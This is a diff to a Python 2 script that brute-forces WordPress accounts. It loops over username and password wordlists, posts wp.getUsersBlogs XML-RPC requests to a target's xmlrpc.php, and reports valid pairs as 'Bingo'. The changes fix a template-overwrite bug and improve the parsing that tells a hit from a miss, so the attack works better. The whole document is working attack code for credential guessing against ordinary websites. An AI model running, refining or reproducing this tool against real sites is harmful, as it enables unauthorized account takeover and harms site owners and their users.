@@ -19,13 +19,13 @@ url = raw_input(bcolors.ENDC + "Type the URL [http://www.myname.com/xmlrpc.php] 
 users = raw_input(bcolors.ENDC + "Users File [blank for default] : ")
 passwords = raw_input(bcolors.ENDC + "Passwords File [blank for default] : ")
 # constants
-users_file = users if users != ""  else 'users.txt'
+users_file = users if users != "" else 'users.txt'
 passwords_file = passwords if passwords != "" else 'passwords.txt'
 headers = {'Content-Type': 'application/xml'}
 xml = """
 <?xml version="1.0" encoding="iso-8859-1"?>
 <methodCall>
-<methodName>wp.getCategories</methodName>
+<methodName>wp.getUsersBlogs</methodName>
 <params>
  <param>
   <value>
@@ -41,22 +41,24 @@ xml = """
 </methodCall>
 """
 # Magic
-try :
+try:
     with open(users_file, 'r') as users:
         for user in users:
             username = user.strip()
             with open(passwords_file, 'r') as passwords:
                 for password in passwords:
-                    xml = xml.replace('username',username).replace('password',password)
-                    res = requests.post(url, data=xml, headers=headers)
+                    post_xml = xml.replace('username', username).replace('password', password)
+                    res = requests.post(url, data=post_xml, headers=headers)
                     tree = ET.ElementTree(ET.fromstring(res.text.encode('utf-8')))
                     root = tree.getroot()
-                    if root[0][0][0][0][1][0].text == '403':
-                        print bcolors.FAIL + str(username) + " : " + password.strip()
-                    else:
-                        print bcolors.OKGREEN + str(username) + " : " + password.strip()
-                        close = raw_input("Do you want to exit? [y/n] ")
-                        if close == 'y':
-                            sys.exit(bcolors.OKGREEN + "Bingo! : " + str(username) + " : " + password.strip())
-except :
-        sys.exit(bcolors.FAIL + "Check your inputs!")
+                    if len(root.findall(".//fault/value/struct/member/value/int")) > 0:
+                      if root.findall(".//fault/value/struct/member/value/int")[0].text == '403':
+                          print bcolors.FAIL + str(username) + " : " + password.strip()
+                    if len(root.findall(".//params/param/value/array/data/value/struct/member[1]/value/boolean")) > 0:
+                      if root.findall(".//params/param/value/array/data/value/struct/member[1]/value/boolean")[0].text == '1':
+                          print bcolors.OKGREEN + "Bingo ==> " + str(username) + " : " + password.strip()
+                          close = raw_input("Do you want to exit? [y/n] ")
+                          if close == 'y':
+                              sys.exit()
+except:
+        sys.exit(bcolors.FAIL + "Closed or wrong input")
